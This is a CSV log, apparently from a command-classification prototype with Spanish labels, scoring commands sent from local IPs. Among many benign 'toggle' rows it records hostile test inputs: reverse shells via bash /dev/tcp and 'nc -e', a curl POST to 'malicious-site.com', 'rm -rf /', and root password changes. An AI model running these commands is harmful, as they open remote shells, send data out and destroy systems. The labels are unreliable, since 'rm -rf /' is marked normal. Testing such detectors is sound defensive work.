timestamp,source_ip,raw_cmd,label,score,reason
2025-11-25T03:41:51.548690,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:42:06.599383,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:42:21.653454,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:42:36.697079,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:42:51.757879,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:43:06.807815,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:43:21.863816,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:50:16.992387,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:50:32.037169,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:50:47.091534,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:59:25.642862,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:59:40.689320,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:59:55.742714,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:00:10.795344,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:00:25.849319,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:00:40.900833,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:00:55.953967,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:01:11.013396,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:02:41.121152,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:02:56.160651,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:04:51.257092,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:12.963432,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:17.232052,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:19.069776,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:19.587700,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:28.392710,192.168.18.41,toggle/2,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:29.315633,192.168.18.41,toggle/2,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:40.583597,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:12.432099,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:13.451538,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:14.371995,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:14.985001,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:22.668066,192.168.18.41,toggle/2,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:23.687328,192.168.18.41,toggle/2,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:24.624080,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:06.900640,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:07.839469,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:08.643494,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:09.357596,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:10.116419,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:11.100108,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:44.002449,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:44.895459,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:45.716859,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:46.737336,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:47.558069,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:48.276140,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:49.000933,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:49.807121,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:38:31.439941,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:42:07.932955,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T18:47:24.397103,192.168.18.22,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T18:55:20.521134,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:23:54.974541,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:23:56.608633,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:24:55.282747,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:24:56.410891,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:24:57.012434,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T19:16:45.615867,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
2025-11-26T19:16:51.140348,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
2025-11-26T19:16:52.775608,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
2025-11-26T19:16:53.905309,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
2025-11-26T19:16:55.031840,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
2025-11-26T19:17:23.704755,192.168.18.22,curl -X POST http://malicious-site.com,sospechoso,0.5543639850508923,modelo cargado
2025-11-26T19:17:45.922063,192.168.18.22,bash -i >& /dev/tcp/127.0.0.1/4444 0>&1,exploit,0.6542279572798932,modelo cargado
2025-11-26T19:20:51.749994,192.168.18.22,bash -i >& /dev/tcp/127.0.0.1/4444 0>&1,exploit,0.6542279572798932,modelo cargado
2025-11-26T19:20:58.226649,192.168.18.22,bash -i >& /dev/tcp/127.0.0.1/4444 0>&1,exploit,0.6542279572798932,modelo cargado
2025-11-26T19:21:12.257010,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T19:21:24.540104,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T19:22:17.954347,192.168.18.22,rm -rf /,normal,0.5638713454818298,modelo cargado
2025-11-26T19:22:21.375528,192.168.18.22,rm -rf /,normal,0.5638713454818298,modelo cargado
2025-11-26T19:22:24.940714,192.168.18.22,rm -rf /,normal,0.5638713454818298,modelo cargado
2025-11-26T19:22:38.538842,192.168.18.22, rm -rf /,normal,0.5638713454818298,modelo cargado
2025-11-26T19:22:52.002593,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:16.157903,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:17.076327,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:17.618660,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:17.799201,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:17.994836,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:18.198740,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:39.908449,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:41.146064,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:41.969603,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:42.776291,192.168.18.22,nc -e /bin/bash 192.168.1.100 4444,exploit,0.6151345572151978,modelo cargado
2025-11-26T19:23:59.393708,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
2025-11-26T19:46:03.559502,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:18:52.960569,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:18:54.146042,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:20:11.359502,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:20:15.965192,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:20:18.320051,10.168.146.151,toggle/2,normal,0.45669215525281515,modelo cargado
2025-11-26T22:20:20.365822,10.168.146.151,toggle/2,normal,0.45669215525281515,modelo cargado
2025-11-26T22:20:21.388000,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:20:24.567802,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:20:50.712067,10.168.146.151,sudo password root,exploit,0.4523887269570001,modelo cargado
2025-11-26T22:21:22.214529,10.168.146.151,cd python,normal,0.45669215525281515,modelo cargado
2025-11-26T22:23:27.459383,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:23:45.991269,10.168.146.151,sudo password root,exploit,0.4523887269570001,modelo cargado
2025-11-26T22:23:47.653673,10.168.146.151,sudo password root,exploit,0.4523887269570001,modelo cargado
2025-11-26T22:23:49.290907,10.168.146.151,sudo password root,exploit,0.4523887269570001,modelo cargado
2025-11-26T22:23:50.491102,10.168.146.151,sudo password root,exploit,0.4523887269570001,modelo cargado
2025-11-26T22:23:50.496280,10.168.146.151,sudo password root,exploit,0.4523887269570001,modelo cargado
2025-11-26T22:23:50.695188,10.168.146.151,sudo password root,exploit,0.4523887269570001,modelo cargado
2025-11-26T22:23:50.733634,10.168.146.151,sudo password root,exploit,0.4523887269570001,modelo cargado
2025-11-26T22:31:05.316346,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:18.183210,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:19.303147,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:19.871797,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:21.756719,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:21.942498,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:22.569623,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:23.297785,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:23.737381,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:24.059174,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:24.414074,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:24.786492,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:25.247991,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:25.552542,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:25.980313,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:26.361548,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:27.079465,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:27.384070,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:27.893213,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:28.518120,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T22:31:28.845613,10.168.146.151,toggle/1,normal,0.45669215525281515,modelo cargado
